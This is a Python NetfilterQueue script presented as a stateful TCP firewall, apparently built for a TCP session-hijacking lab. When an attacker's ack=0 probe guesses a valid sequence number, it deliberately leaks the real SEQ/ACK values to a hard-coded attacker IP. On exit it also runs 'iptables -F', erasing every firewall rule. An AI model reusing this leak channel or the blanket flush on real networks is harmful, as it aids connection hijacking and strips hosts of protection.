from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, send as scapy_send, Raw

# ==========================
# Global Variables
# ==========================

connections = {}
attack_count = 0
WINDOW_SIZE = 65535

# Attacker notification
ATTACKER_IP = "30.0.0.30"
NOTIFY_PORT = 9999

nfqueue = None
found = False

print("=" * 60)
print(" Stateful TCP Firewall Started ")
print("=" * 60)


def print_packet(ip, tcp, flags):
    print("\n" + "=" * 60)
    print("TCP PACKET")
    print("=" * 60)
    print(f"Source IP      : {ip.src}")
    print(f"Destination IP : {ip.dst}")
    print(f"Source Port    : {tcp.sport}")
    print(f"Destination    : {tcp.dport}")
    print(f"Flags          : {flags}")
    print(f"SEQ            : {tcp.seq}")
    print(f"ACK            : {tcp.ack}")


def print_connection_table():
    print("\n==== CONNECTION TABLE ================")
    for conn, info in connections.items():
        print(conn, info)
    print("======================================\n")


def notify_attacker(client_seq, server_seq):
    """
    Send TCP packet to attacker with real values:
      packet.seq = real client_seq
      packet.ack = real server_seq
    """
    notify = (
        IP(dst=ATTACKER_IP)
        / TCP(
            sport=NOTIFY_PORT,
            dport=NOTIFY_PORT,
            seq=client_seq,
            ack=server_seq,
            flags="PA"
        )
        / Raw(load=b"SEQ_ACK_FOUND")
    )

    # Send 3 times for reliability
    for _ in range(3):
        scapy_send(notify, verbose=False)


# ==========================
# Packet Processing
# ==========================

def process(packet):
    global attack_count, nfqueue, found

    ip = IP(packet.get_payload())

    if TCP not in ip:
        packet.accept()
        return

    tcp = ip[TCP]
    flags = tcp.sprintf("%TCP.flags%")

    # -------------------------
    # SYN
    # -------------------------
    if flags == "S":

        key = (ip.src, ip.dst, tcp.sport, tcp.dport)

        connections[key] = {
            "state": "SYN_SENT",
            "client_seq": tcp.seq + 1,
            "server_seq": 0
        }

        print(f"\n[+] NEW CONNECTION {key}")
        packet.accept()
        return

    # -------------------------
    # SYN ACK
    # -------------------------
    elif flags == "SA":

        key = (ip.dst, ip.src, tcp.dport, tcp.sport)

        if key in connections:
            connections[key]["state"] = "SYN_RECEIVED"
            connections[key]["server_seq"] = tcp.seq + 1
            print("[+] SYN ACK")

        packet.accept()
        return

    # -------------------------
    # ACK
    # -------------------------
    elif flags == "A":

        key = (ip.src, ip.dst, tcp.sport, tcp.dport)

        if key in connections:
            connections[key]["state"] = "ESTABLISHED"
            print("[+] CONNECTION ESTABLISHED")
            print_connection_table()

        packet.accept()
        return

    # -------------------------
    # DATA (PSH / ACK)
    # -------------------------
    elif "P" in flags:

        key = (ip.src, ip.dst, tcp.sport, tcp.dport)
        reverse_key = (ip.dst, ip.src, tcp.dport, tcp.sport)

        conn_key = None

        if key in connections:
            conn_key = key
        elif reverse_key in connections:
            conn_key = reverse_key

        # -------------------------
        # Connection Exists
        # -------------------------
        if conn_key and connections[conn_key]["state"] == "ESTABLISHED":

            if key == conn_key:
                expected_seq = connections[conn_key]["client_seq"]
            else:
                expected_seq = connections[conn_key]["server_seq"]

            window_start = expected_seq
            window_end = (expected_seq + WINDOW_SIZE) & 0xFFFFFFFF

            # -------------------------
            # Invalid Sequence
            # -------------------------
            if not (window_start <= tcp.seq <= window_end):
                packet.drop()
                return

            # =========================================
            # VALID SEQUENCE FOUND
            # =========================================

            # Check if this is attacker's probe (ack=0)
            # Real client always has correct ACK (never 0)
            if tcp.ack == 0 and not found:

                real_client_seq = expected_seq
                real_server_seq = connections[conn_key]["server_seq"]

                print("\n" + "!" * 60)
                print("  ATTACKER GUESSED CORRECT SEQ!")
                print("!" * 60)
                print(f"  Client SEQ : {real_client_seq}")
                print(f"  Server SEQ : {real_server_seq}")
                print("!" * 60)
                print("\n[*] Sending values to attacker...")

                notify_attacker(real_client_seq, real_server_seq)

                print("[*] Notification sent to attacker")
                print("[*] Firewall continues running — forwarding packets...\n")

                found = True

                # DON'T update client_seq here!
                # Server will drop this packet (ack=0 is invalid)
                # So server's RCV.NXT stays the same
                # Firewall must stay in sync with server
                packet.accept()
                return

            # Normal valid packet — update seq tracking
            payload_len = len(bytes(tcp.payload))

            if key == conn_key:
                connections[conn_key]["client_seq"] = tcp.seq + payload_len
            else:
                connections[conn_key]["server_seq"] = tcp.seq + payload_len

            packet.accept()
            return

        # -------------------------
        # No Connection Found
        # -------------------------
        attack_count += 1
        packet.drop()
        return

    # -------------------------
    # Accept Other TCP
    # -------------------------
    packet.accept()


# ==========================
# Main
# ==========================

if __name__ == "__main__":

    nfqueue = NetfilterQueue()
    nfqueue.bind(0, process)

    print("\n" + "=" * 60)
    print("Stateful TCP Firewall Running...")
    print("Listening on NFQUEUE 0")
    print("Waiting for attacker probe...")
    print("=" * 60)

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("\nStopping firewall...")
    finally:
        try:
            nfqueue.unbind()
        except:
            pass

        # Flush NFQUEUE rules so packets flow normally after exit
        import os
        os.system("iptables -F")
        print("[*] iptables flushed — packets flow normally now")